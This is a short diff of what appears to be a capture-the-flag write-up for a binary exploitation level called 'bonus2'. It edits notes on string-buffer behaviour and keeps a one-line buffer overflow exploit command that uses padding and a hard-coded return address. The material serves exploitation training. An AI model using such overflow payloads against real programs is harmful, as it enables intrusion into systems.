@@ -18,7 +18,7 @@ Set original string:
 
 Intersting behavior:
 	If first part of the original string 
-	is filled fully, it will considered
+	is fully filled, it will considered
 	as one unique string. And from two 
 	string limited, we can reach a string
 	of 72 in a row.
@@ -57,7 +57,3 @@ Naughty behavior:
 	and 4 bytes more to write adress.
 
 LANG=fi ; ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "C" * 18 + "\xef\xf8\xff\xbf" + "C" * 10')	
-	
-	
-
-
